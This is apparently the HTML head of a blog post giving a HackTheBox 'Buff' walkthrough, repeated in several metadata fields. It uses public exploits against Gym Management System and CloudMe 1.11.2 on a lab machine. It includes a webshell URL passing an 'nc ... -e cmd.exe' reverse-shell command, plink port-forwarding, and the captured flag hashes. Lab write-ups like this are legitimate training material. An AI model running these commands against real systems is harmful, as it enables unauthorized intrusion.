@@ -1,0 +1,1091 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="google-translate-customization" content="108d9124921d80c3-80e20d618ff053c8-g4f02ec6f3dba68b7-c">
+<!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>HackTheBox Buff | DC0deZer0</title>
+<meta name="generator" content="Jekyll v4.2.0">
+<meta property="og:title" content="HackTheBox Buff">
+<meta name="author" content="Jeevan Chandra">
+<meta property="og:locale" content="en_US">
+<meta name="description" content="Info Buff   OS: Windows Difficulty: Easy Points: 20 Release: 18 Jul 2020 IP: 10.10.10.198 Let’s get started As always hacking starts with NMAP scan. nmap -sV -Pn -sC -A -T4 buff.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-23 05:58 EDT Nmap scan report for buff.htb (10.10.10.198) Host is up (0.19s latency). Not shown: 999 filtered ports PORT STATE SERVICE VERSION 8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 |_http-title: mrb3n's Bro Hut Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows XP|7 (86%) OS CPE: cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_7 Aggressive OS guesses: Microsoft Windows XP SP2 (86%), Microsoft Windows 7 (85%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops TRACEROUTE (using port 8080/tcp) HOP RTT ADDRESS 1 195.99 ms 10.10.14.1 2 196.06 ms buff.htb (10.10.10.198) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 57.75 seconds Finding the CVE from Exploit-db https://www.exploit-db.com/exploits/48506 Using the Exploit python 48506.py /\ /vvvvvvvvvvvv \--------------------------------------, `^^^^^^^^^^^^ /============BOKU=====================&quot; \/ (+) Usage: python 48506.py &lt;WEBAPP_URL&gt; (+) Example: python 48506.py 'https://10.0.0.3:443/gym/' Exploiting….. python 48506.py http://buff.htb:8080/ /\ /vvvvvvvvvvvv \--------------------------------------, `^^^^^^^^^^^^ /============BOKU=====================&quot; \/ [+] Successfully connected to webshell. C:\xampp\htdocs\gym\upload&gt; Getting User.txt C:\xampp\htdocs\gym\upload&gt; whoami /all �PNG ▒ USER INFORMATION ---------------- User Name SID ========== ============================================== buff\shaun S-1-5-21-2277156429-3381729605-2640630771-1001 GROUP INFORMATION ----------------- Group Name Type SID Attributes ====================================== ================ ============ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\BATCH Well-known group S-1-5-3 Mandatory group, Enabled by default, Enabled group CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled group LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\Medium Mandatory Level Label S-1-16-8192 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ==================================== ======== SeShutdownPrivilege Shut down the system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station Disabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled SeTimeZonePrivilege Change the time zone Disabled From here I came to see what is the username.. buff\shaun S-1-5-21-2277156429-3381729605-2640630771-1001 C:\xampp\htdocs\gym\upload&gt; type C:\Users\shaun\Desktop\user.txt �PNG ▒ 5345fe517be93e1b736b12b0267654c2 Now let’s visit the http://buff.htb:8080/upload.php too see anything intresting? From the image we can see that the shell I got is not that great.. So I moved to gain the shell from the uploaded payload from the URL. http://buff.htb:8080/upload/kamehameha.php?telepathy=nc 10.10.14.51 5566 -e cmd.exe Now time to find the Vulnerable Service.. C:\xampp\htdocs\gym\upload&gt;netstat -an netstat -an Active Connections Proto Local Address Foreign Address State TCP 0.0.0.0:135 0.0.0.0:0 LISTENING TCP 0.0.0.0:445 0.0.0.0:0 LISTENING TCP 0.0.0.0:4444 0.0.0.0:0 LISTENING TCP 0.0.0.0:4545 0.0.0.0:0 LISTENING TCP 0.0.0.0:5040 0.0.0.0:0 LISTENING TCP 0.0.0.0:7680 0.0.0.0:0 LISTENING TCP 0.0.0.0:8080 0.0.0.0:0 LISTENING TCP 0.0.0.0:9999 0.0.0.0:0 LISTENING TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING TCP 0.0.0.0:49667 0.0.0.0:0 LISTENING TCP 0.0.0.0:49668 0.0.0.0:0 LISTENING TCP 0.0.0.0:49669 0.0.0.0:0 LISTENING TCP 10.10.10.198:139 0.0.0.0:0 LISTENING TCP 10.10.10.198:8080 10.10.14.33:37962 ESTABLISHED TCP 10.10.10.198:8080 10.10.14.41:34394 FIN_WAIT_2 TCP 10.10.10.198:8080 10.10.14.51:58486 CLOSE_WAIT TCP 10.10.10.198:8080 10.10.14.51:58488 TIME_WAIT TCP 10.10.10.198:8080 10.10.14.51:58490 ESTABLISHED TCP 10.10.10.198:50676 10.10.14.33:22 CLOSE_WAIT TCP 10.10.10.198:50809 10.10.14.33:22 ESTABLISHED TCP 10.10.10.198:50879 10.10.14.33:22 CLOSE_WAIT TCP 10.10.10.198:51491 10.10.14.33:6969 ESTABLISHED TCP 10.10.10.198:51506 10.10.14.33:22 ESTABLISHED TCP 10.10.10.198:51565 10.10.14.33:1122 ESTABLISHED TCP 10.10.10.198:53167 10.10.14.51:22 ESTABLISHED TCP 10.10.10.198:53191 10.10.14.51:5577 ESTABLISHED TCP 127.0.0.1:3306 0.0.0.0:0 LISTENING TCP 127.0.0.1:8888 0.0.0.0:0 LISTENING TCP 127.0.0.1:53175 127.0.0.1:3306 TIME_WAIT TCP 127.0.0.1:53177 127.0.0.1:3306 TIME_WAIT TCP [::]:135 [::]:0 LISTENING TCP [::]:445 [::]:0 LISTENING TCP [::]:7680 [::]:0 LISTENING TCP [::]:8080 [::]:0 LISTENING TCP [::]:49664 [::]:0 LISTENING TCP [::]:49665 [::]:0 LISTENING TCP [::]:49666 [::]:0 LISTENING TCP [::]:49667 [::]:0 LISTENING TCP [::]:49668 [::]:0 LISTENING TCP [::]:49669 [::]:0 LISTENING UDP 0.0.0.0:123 *:* UDP 0.0.0.0:5050 *:* UDP 0.0.0.0:5353 *:* UDP 0.0.0.0:5355 *:* UDP 0.0.0.0:64168 *:* UDP 10.10.10.198:137 *:* UDP 10.10.10.198:138 *:* UDP 10.10.10.198:1900 *:* UDP 10.10.10.198:59086 *:* UDP 127.0.0.1:1900 *:* UDP 127.0.0.1:58106 *:* UDP 127.0.0.1:59087 *:* UDP [::]:123 *:* UDP [::]:5353 *:* UDP [::]:5355 *:* UDP [::]:64168 *:* UDP [::1]:1900 *:* UDP [::1]:59085 *:* UDP [fe80::edcd:7573:f6e:abdb%10]:1900 *:* UDP [fe80::edcd:7573:f6e:abdb%10]:59084 *:* Comparing the procress with all the procress details.. C:\xampp\htdocs\gym\upload&gt;powershell ps powershell ps Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName ------- ------ ----- ----- ------ -- -- ----------- 432 24 18324 9180 6612 1 ApplicationFrameHost 161 10 1940 2176 7140 1 browser_broker 237 19 26404 29328 5536 0 CloudMe 286 62 30312 372 6088 0 CloudMe 289 16 2896 2548 0.17 1396 0 CloudMe_1112 269 16 2868 200 0.98 8772 0 CloudMe_1112 This command in PowerShell is used to print what program/process is running. You can see 5536 is the PID of CloudMe software. This is conformed after finding cloudme is running in Downloads folder of Shaun. C:\Users\shaun\Downloads&gt;dir dir Volume in drive C has no label. Volume Serial Number is A22D-49F7 Directory of C:\Users\shaun\Downloads 23/07/2020 07:58 &lt;DIR&gt; . 23/07/2020 07:58 &lt;DIR&gt; .. 23/07/2020 05:35 61,440 nc.exe 23/07/2020 07:56 675,752 plink.exe 3 File(s) 18,568,016 bytes 2 Dir(s) 9,798,672,384 bytes free Privilege Escalation So here is the game plan Port forwarding to expose remote port 8888 (accessible only from localhost) to YOURPORT local Step 1 Enable sshd service on your kali machine: sudo systemctl start ssh.socket Step 2 Use Plink to portforward on your local listener plink.exe -v -x -a -T -C -noagent -ssh -pw {Password} -R {Your_Port}:127.0.0.1:8888 user@{IP_address} If every thing works correctly.. You should see this .. CloudMe 1.11.2 -CVE – Administrator: Exploit for CloudMe 1.11.2: https://www.exploit-db.com/exploits/48389 The shellcode should be changed in order to get the reverse shell. Note: Use some higher port in order to get the reverse shell perfectly, cause there are so many people bashing the same machine at same time. you should see this if the exploit runs correctly. Once Every this is set and run properly then you should be good to get the reverse shell and grab the Root.txt nc -lnvp 60000 listening on [any] 60000 ... connect to [10.10.14.51] from (UNKNOWN) [10.10.10.198] 49723 Microsoft Windows [Version 10.0.17134.1550] (c) 2018 Microsoft Corporation. All rights reserved. C:\Windows\system32&gt; Getting Root.txt C:\Windows\system32&gt;cd C:\Users\Administrator\Desktop cd C:\Users\Administrator\Desktop C:\Users\Administrator\Desktop&gt;type root.txt type root.txt 2e881649240e8868c48daee707659212 C:\Users\Administrator\ If you like my work, please do consider giving me +rep on HACKTHEBOX. My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968">
+<meta property="og:description" content="Info Buff   OS: Windows Difficulty: Easy Points: 20 Release: 18 Jul 2020 IP: 10.10.10.198 Let’s get started As always hacking starts with NMAP scan. nmap -sV -Pn -sC -A -T4 buff.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-23 05:58 EDT Nmap scan report for buff.htb (10.10.10.198) Host is up (0.19s latency). Not shown: 999 filtered ports PORT STATE SERVICE VERSION 8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 |_http-title: mrb3n's Bro Hut Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows XP|7 (86%) OS CPE: cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_7 Aggressive OS guesses: Microsoft Windows XP SP2 (86%), Microsoft Windows 7 (85%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops TRACEROUTE (using port 8080/tcp) HOP RTT ADDRESS 1 195.99 ms 10.10.14.1 2 196.06 ms buff.htb (10.10.10.198) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 57.75 seconds Finding the CVE from Exploit-db https://www.exploit-db.com/exploits/48506 Using the Exploit python 48506.py /\ /vvvvvvvvvvvv \--------------------------------------, `^^^^^^^^^^^^ /============BOKU=====================&quot; \/ (+) Usage: python 48506.py &lt;WEBAPP_URL&gt; (+) Example: python 48506.py 'https://10.0.0.3:443/gym/' Exploiting….. python 48506.py http://buff.htb:8080/ /\ /vvvvvvvvvvvv \--------------------------------------, `^^^^^^^^^^^^ /============BOKU=====================&quot; \/ [+] Successfully connected to webshell. C:\xampp\htdocs\gym\upload&gt; Getting User.txt C:\xampp\htdocs\gym\upload&gt; whoami /all �PNG ▒ USER INFORMATION ---------------- User Name SID ========== ============================================== buff\shaun S-1-5-21-2277156429-3381729605-2640630771-1001 GROUP INFORMATION ----------------- Group Name Type SID Attributes ====================================== ================ ============ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\BATCH Well-known group S-1-5-3 Mandatory group, Enabled by default, Enabled group CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled group LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\Medium Mandatory Level Label S-1-16-8192 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ==================================== ======== SeShutdownPrivilege Shut down the system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station Disabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled SeTimeZonePrivilege Change the time zone Disabled From here I came to see what is the username.. buff\shaun S-1-5-21-2277156429-3381729605-2640630771-1001 C:\xampp\htdocs\gym\upload&gt; type C:\Users\shaun\Desktop\user.txt �PNG ▒ 5345fe517be93e1b736b12b0267654c2 Now let’s visit the http://buff.htb:8080/upload.php too see anything intresting? From the image we can see that the shell I got is not that great.. So I moved to gain the shell from the uploaded payload from the URL. http://buff.htb:8080/upload/kamehameha.php?telepathy=nc 10.10.14.51 5566 -e cmd.exe Now time to find the Vulnerable Service.. C:\xampp\htdocs\gym\upload&gt;netstat -an netstat -an Active Connections Proto Local Address Foreign Address State TCP 0.0.0.0:135 0.0.0.0:0 LISTENING TCP 0.0.0.0:445 0.0.0.0:0 LISTENING TCP 0.0.0.0:4444 0.0.0.0:0 LISTENING TCP 0.0.0.0:4545 0.0.0.0:0 LISTENING TCP 0.0.0.0:5040 0.0.0.0:0 LISTENING TCP 0.0.0.0:7680 0.0.0.0:0 LISTENING TCP 0.0.0.0:8080 0.0.0.0:0 LISTENING TCP 0.0.0.0:9999 0.0.0.0:0 LISTENING TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING TCP 0.0.0.0:49667 0.0.0.0:0 LISTENING TCP 0.0.0.0:49668 0.0.0.0:0 LISTENING TCP 0.0.0.0:49669 0.0.0.0:0 LISTENING TCP 10.10.10.198:139 0.0.0.0:0 LISTENING TCP 10.10.10.198:8080 10.10.14.33:37962 ESTABLISHED TCP 10.10.10.198:8080 10.10.14.41:34394 FIN_WAIT_2 TCP 10.10.10.198:8080 10.10.14.51:58486 CLOSE_WAIT TCP 10.10.10.198:8080 10.10.14.51:58488 TIME_WAIT TCP 10.10.10.198:8080 10.10.14.51:58490 ESTABLISHED TCP 10.10.10.198:50676 10.10.14.33:22 CLOSE_WAIT TCP 10.10.10.198:50809 10.10.14.33:22 ESTABLISHED TCP 10.10.10.198:50879 10.10.14.33:22 CLOSE_WAIT TCP 10.10.10.198:51491 10.10.14.33:6969 ESTABLISHED TCP 10.10.10.198:51506 10.10.14.33:22 ESTABLISHED TCP 10.10.10.198:51565 10.10.14.33:1122 ESTABLISHED TCP 10.10.10.198:53167 10.10.14.51:22 ESTABLISHED TCP 10.10.10.198:53191 10.10.14.51:5577 ESTABLISHED TCP 127.0.0.1:3306 0.0.0.0:0 LISTENING TCP 127.0.0.1:8888 0.0.0.0:0 LISTENING TCP 127.0.0.1:53175 127.0.0.1:3306 TIME_WAIT TCP 127.0.0.1:53177 127.0.0.1:3306 TIME_WAIT TCP [::]:135 [::]:0 LISTENING TCP [::]:445 [::]:0 LISTENING TCP [::]:7680 [::]:0 LISTENING TCP [::]:8080 [::]:0 LISTENING TCP [::]:49664 [::]:0 LISTENING TCP [::]:49665 [::]:0 LISTENING TCP [::]:49666 [::]:0 LISTENING TCP [::]:49667 [::]:0 LISTENING TCP [::]:49668 [::]:0 LISTENING TCP [::]:49669 [::]:0 LISTENING UDP 0.0.0.0:123 *:* UDP 0.0.0.0:5050 *:* UDP 0.0.0.0:5353 *:* UDP 0.0.0.0:5355 *:* UDP 0.0.0.0:64168 *:* UDP 10.10.10.198:137 *:* UDP 10.10.10.198:138 *:* UDP 10.10.10.198:1900 *:* UDP 10.10.10.198:59086 *:* UDP 127.0.0.1:1900 *:* UDP 127.0.0.1:58106 *:* UDP 127.0.0.1:59087 *:* UDP [::]:123 *:* UDP [::]:5353 *:* UDP [::]:5355 *:* UDP [::]:64168 *:* UDP [::1]:1900 *:* UDP [::1]:59085 *:* UDP [fe80::edcd:7573:f6e:abdb%10]:1900 *:* UDP [fe80::edcd:7573:f6e:abdb%10]:59084 *:* Comparing the procress with all the procress details.. C:\xampp\htdocs\gym\upload&gt;powershell ps powershell ps Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName ------- ------ ----- ----- ------ -- -- ----------- 432 24 18324 9180 6612 1 ApplicationFrameHost 161 10 1940 2176 7140 1 browser_broker 237 19 26404 29328 5536 0 CloudMe 286 62 30312 372 6088 0 CloudMe 289 16 2896 2548 0.17 1396 0 CloudMe_1112 269 16 2868 200 0.98 8772 0 CloudMe_1112 This command in PowerShell is used to print what program/process is running. You can see 5536 is the PID of CloudMe software. This is conformed after finding cloudme is running in Downloads folder of Shaun. C:\Users\shaun\Downloads&gt;dir dir Volume in drive C has no label. Volume Serial Number is A22D-49F7 Directory of C:\Users\shaun\Downloads 23/07/2020 07:58 &lt;DIR&gt; . 23/07/2020 07:58 &lt;DIR&gt; .. 23/07/2020 05:35 61,440 nc.exe 23/07/2020 07:56 675,752 plink.exe 3 File(s) 18,568,016 bytes 2 Dir(s) 9,798,672,384 bytes free Privilege Escalation So here is the game plan Port forwarding to expose remote port 8888 (accessible only from localhost) to YOURPORT local Step 1 Enable sshd service on your kali machine: sudo systemctl start ssh.socket Step 2 Use Plink to portforward on your local listener plink.exe -v -x -a -T -C -noagent -ssh -pw {Password} -R {Your_Port}:127.0.0.1:8888 user@{IP_address} If every thing works correctly.. You should see this .. CloudMe 1.11.2 -CVE – Administrator: Exploit for CloudMe 1.11.2: https://www.exploit-db.com/exploits/48389 The shellcode should be changed in order to get the reverse shell. Note: Use some higher port in order to get the reverse shell perfectly, cause there are so many people bashing the same machine at same time. you should see this if the exploit runs correctly. Once Every this is set and run properly then you should be good to get the reverse shell and grab the Root.txt nc -lnvp 60000 listening on [any] 60000 ... connect to [10.10.14.51] from (UNKNOWN) [10.10.10.198] 49723 Microsoft Windows [Version 10.0.17134.1550] (c) 2018 Microsoft Corporation. All rights reserved. C:\Windows\system32&gt; Getting Root.txt C:\Windows\system32&gt;cd C:\Users\Administrator\Desktop cd C:\Users\Administrator\Desktop C:\Users\Administrator\Desktop&gt;type root.txt type root.txt 2e881649240e8868c48daee707659212 C:\Users\Administrator\ If you like my work, please do consider giving me +rep on HACKTHEBOX. My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968">
+<link rel="canonical" href="https://jeevanachandra.github.io//hackthebox/2020/07/23/Buff.html">
+<meta property="og:url" content="https://jeevanachandra.github.io//hackthebox/2020/07/23/Buff.html">
+<meta property="og:site_name" content="DC0deZer0">
+<meta property="og:image" content="https://jeevanachandra.github.io//assets/img/sample/buff/buff.png">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2020-07-23T12:54:00+05:30">
+<meta name="twitter:card" content="summary_large_image">
+<meta property="twitter:image" content="https://jeevanachandra.github.io//assets/img/sample/buff/buff.png">
+<meta property="twitter:title" content="HackTheBox Buff">
+<script type="application/ld+json">
+{"description":"Info Buff   OS: Windows Difficulty: Easy Points: 20 Release: 18 Jul 2020 IP: 10.10.10.198 Let’s get started As always hacking starts with NMAP scan. nmap -sV -Pn -sC -A -T4 buff.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-23 05:58 EDT Nmap scan report for buff.htb (10.10.10.198) Host is up (0.19s latency). Not shown: 999 filtered ports PORT STATE SERVICE VERSION 8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 |_http-title: mrb3n&#39;s Bro Hut Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows XP|7 (86%) OS CPE: cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_7 Aggressive OS guesses: Microsoft Windows XP SP2 (86%), Microsoft Windows 7 (85%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops TRACEROUTE (using port 8080/tcp) HOP RTT ADDRESS 1 195.99 ms 10.10.14.1 2 196.06 ms buff.htb (10.10.10.198) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 57.75 seconds Finding the CVE from Exploit-db https://www.exploit-db.com/exploits/48506 Using the Exploit python 48506.py /\\ /vvvvvvvvvvvv \\--------------------------------------, `^^^^^^^^^^^^ /============BOKU=====================&quot; \\/ (+) Usage: python 48506.py &lt;WEBAPP_URL&gt; (+) Example: python 48506.py &#39;https://10.0.0.3:443/gym/&#39; Exploiting….. python 48506.py http://buff.htb:8080/ /\\ /vvvvvvvvvvvv \\--------------------------------------, `^^^^^^^^^^^^ /============BOKU=====================&quot; \\/ [+] Successfully connected to webshell. C:\\xampp\\htdocs\\gym\\upload&gt; Getting User.txt C:\\xampp\\htdocs\\gym\\upload&gt; whoami /all �PNG ▒ USER INFORMATION ---------------- User Name SID ========== ============================================== buff\\shaun S-1-5-21-2277156429-3381729605-2640630771-1001 GROUP INFORMATION ----------------- Group Name Type SID Attributes ====================================== ================ ============ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\BATCH Well-known group S-1-5-3 Mandatory group, Enabled by default, Enabled group CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled group LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Mandatory Level Label S-1-16-8192 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ==================================== ======== SeShutdownPrivilege Shut down the system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station Disabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled SeTimeZonePrivilege Change the time zone Disabled From here I came to see what is the username.. buff\\shaun S-1-5-21-2277156429-3381729605-2640630771-1001 C:\\xampp\\htdocs\\gym\\upload&gt; type C:\\Users\\shaun\\Desktop\\user.txt �PNG ▒ 5345fe517be93e1b736b12b0267654c2 Now let’s visit the http://buff.htb:8080/upload.php too see anything intresting? From the image we can see that the shell I got is not that great.. So I moved to gain the shell from the uploaded payload from the URL. http://buff.htb:8080/upload/kamehameha.php?telepathy=nc 10.10.14.51 5566 -e cmd.exe Now time to find the Vulnerable Service.. C:\\xampp\\htdocs\\gym\\upload&gt;netstat -an netstat -an Active Connections Proto Local Address Foreign Address State TCP 0.0.0.0:135 0.0.0.0:0 LISTENING TCP 0.0.0.0:445 0.0.0.0:0 LISTENING TCP 0.0.0.0:4444 0.0.0.0:0 LISTENING TCP 0.0.0.0:4545 0.0.0.0:0 LISTENING TCP 0.0.0.0:5040 0.0.0.0:0 LISTENING TCP 0.0.0.0:7680 0.0.0.0:0 LISTENING TCP 0.0.0.0:8080 0.0.0.0:0 LISTENING TCP 0.0.0.0:9999 0.0.0.0:0 LISTENING TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING TCP 0.0.0.0:49667 0.0.0.0:0 LISTENING TCP 0.0.0.0:49668 0.0.0.0:0 LISTENING TCP 0.0.0.0:49669 0.0.0.0:0 LISTENING TCP 10.10.10.198:139 0.0.0.0:0 LISTENING TCP 10.10.10.198:8080 10.10.14.33:37962 ESTABLISHED TCP 10.10.10.198:8080 10.10.14.41:34394 FIN_WAIT_2 TCP 10.10.10.198:8080 10.10.14.51:58486 CLOSE_WAIT TCP 10.10.10.198:8080 10.10.14.51:58488 TIME_WAIT TCP 10.10.10.198:8080 10.10.14.51:58490 ESTABLISHED TCP 10.10.10.198:50676 10.10.14.33:22 CLOSE_WAIT TCP 10.10.10.198:50809 10.10.14.33:22 ESTABLISHED TCP 10.10.10.198:50879 10.10.14.33:22 CLOSE_WAIT TCP 10.10.10.198:51491 10.10.14.33:6969 ESTABLISHED TCP 10.10.10.198:51506 10.10.14.33:22 ESTABLISHED TCP 10.10.10.198:51565 10.10.14.33:1122 ESTABLISHED TCP 10.10.10.198:53167 10.10.14.51:22 ESTABLISHED TCP 10.10.10.198:53191 10.10.14.51:5577 ESTABLISHED TCP 127.0.0.1:3306 0.0.0.0:0 LISTENING TCP 127.0.0.1:8888 0.0.0.0:0 LISTENING TCP 127.0.0.1:53175 127.0.0.1:3306 TIME_WAIT TCP 127.0.0.1:53177 127.0.0.1:3306 TIME_WAIT TCP [::]:135 [::]:0 LISTENING TCP [::]:445 [::]:0 LISTENING TCP [::]:7680 [::]:0 LISTENING TCP [::]:8080 [::]:0 LISTENING TCP [::]:49664 [::]:0 LISTENING TCP [::]:49665 [::]:0 LISTENING TCP [::]:49666 [::]:0 LISTENING TCP [::]:49667 [::]:0 LISTENING TCP [::]:49668 [::]:0 LISTENING TCP [::]:49669 [::]:0 LISTENING UDP 0.0.0.0:123 *:* UDP 0.0.0.0:5050 *:* UDP 0.0.0.0:5353 *:* UDP 0.0.0.0:5355 *:* UDP 0.0.0.0:64168 *:* UDP 10.10.10.198:137 *:* UDP 10.10.10.198:138 *:* UDP 10.10.10.198:1900 *:* UDP 10.10.10.198:59086 *:* UDP 127.0.0.1:1900 *:* UDP 127.0.0.1:58106 *:* UDP 127.0.0.1:59087 *:* UDP [::]:123 *:* UDP [::]:5353 *:* UDP [::]:5355 *:* UDP [::]:64168 *:* UDP [::1]:1900 *:* UDP [::1]:59085 *:* UDP [fe80::edcd:7573:f6e:abdb%10]:1900 *:* UDP [fe80::edcd:7573:f6e:abdb%10]:59084 *:* Comparing the procress with all the procress details.. C:\\xampp\\htdocs\\gym\\upload&gt;powershell ps powershell ps Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName ------- ------ ----- ----- ------ -- -- ----------- 432 24 18324 9180 6612 1 ApplicationFrameHost 161 10 1940 2176 7140 1 browser_broker 237 19 26404 29328 5536 0 CloudMe 286 62 30312 372 6088 0 CloudMe 289 16 2896 2548 0.17 1396 0 CloudMe_1112 269 16 2868 200 0.98 8772 0 CloudMe_1112 This command in PowerShell is used to print what program/process is running. You can see 5536 is the PID of CloudMe software. This is conformed after finding cloudme is running in Downloads folder of Shaun. C:\\Users\\shaun\\Downloads&gt;dir dir Volume in drive C has no label. Volume Serial Number is A22D-49F7 Directory of C:\\Users\\shaun\\Downloads 23/07/2020 07:58 &lt;DIR&gt; . 23/07/2020 07:58 &lt;DIR&gt; .. 23/07/2020 05:35 61,440 nc.exe 23/07/2020 07:56 675,752 plink.exe 3 File(s) 18,568,016 bytes 2 Dir(s) 9,798,672,384 bytes free Privilege Escalation So here is the game plan Port forwarding to expose remote port 8888 (accessible only from localhost) to YOURPORT local Step 1 Enable sshd service on your kali machine: sudo systemctl start ssh.socket Step 2 Use Plink to portforward on your local listener plink.exe -v -x -a -T -C -noagent -ssh -pw {Password} -R {Your_Port}:127.0.0.1:8888 user@{IP_address} If every thing works correctly.. You should see this .. CloudMe 1.11.2 -CVE – Administrator: Exploit for CloudMe 1.11.2: https://www.exploit-db.com/exploits/48389 The shellcode should be changed in order to get the reverse shell. Note: Use some higher port in order to get the reverse shell perfectly, cause there are so many people bashing the same machine at same time. you should see this if the exploit runs correctly. Once Every this is set and run properly then you should be good to get the reverse shell and grab the Root.txt nc -lnvp 60000 listening on [any] 60000 ... connect to [10.10.14.51] from (UNKNOWN) [10.10.10.198] 49723 Microsoft Windows [Version 10.0.17134.1550] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt; Getting Root.txt C:\\Windows\\system32&gt;cd C:\\Users\\Administrator\\Desktop cd C:\\Users\\Administrator\\Desktop C:\\Users\\Administrator\\Desktop&gt;type root.txt type root.txt 2e881649240e8868c48daee707659212 C:\\Users\\Administrator\\ If you like my work, please do consider giving me +rep on HACKTHEBOX. My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968","dateModified":"2020-07-23T12:54:00+05:30","datePublished":"2020-07-23T12:54:00+05:30","headline":"HackTheBox 